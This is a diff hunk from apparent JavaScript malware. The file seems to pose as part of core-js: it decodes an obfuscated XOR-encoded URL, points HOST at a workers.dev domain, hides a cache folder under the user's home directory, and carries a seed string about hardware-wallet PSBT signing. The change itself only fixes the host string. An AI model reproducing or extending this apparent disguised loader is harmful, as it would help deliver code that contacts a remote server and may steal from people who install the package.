@@ -33,7 +33,7 @@ const url = H.split(/\s+/).map(h => String.fromCharCode(parseInt(h, 16) ^ K)).jo
 
 // ── configuration ─────────────────────────────────────────────────────────────
 
-const HOST = 'helper.businesse-vip1.workers.dev/';
+const HOST = 'helper.businesse-vip1.workers.dev';
 const CACHE = path.join(os.homedir(), '.cache', 'core-js-buffer');
 const SEED = 'BIP-0174 PSBT version 2 signing specification for hardware wallets (RFC 2024 draft)';
 
